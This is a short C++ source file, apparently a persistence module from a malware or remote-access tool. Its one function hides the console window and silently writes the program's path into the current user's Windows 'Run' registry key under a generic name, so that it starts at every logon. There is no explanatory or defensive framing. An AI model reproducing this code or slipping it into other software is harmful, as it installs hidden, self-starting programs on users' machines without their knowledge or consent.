#include "persistence.h"

#include <windows.h>

void persist(char* currentdir) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HKEY hKey;
    RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );

    
    size_t len = strlen(currentdir);
    byte* byteData = reinterpret_cast<byte*>(currentdir);
    RegSetValueExA(hKey, "MyAppName", 0, REG_SZ, byteData, len + 1);
    RegCloseKey(hKey);
}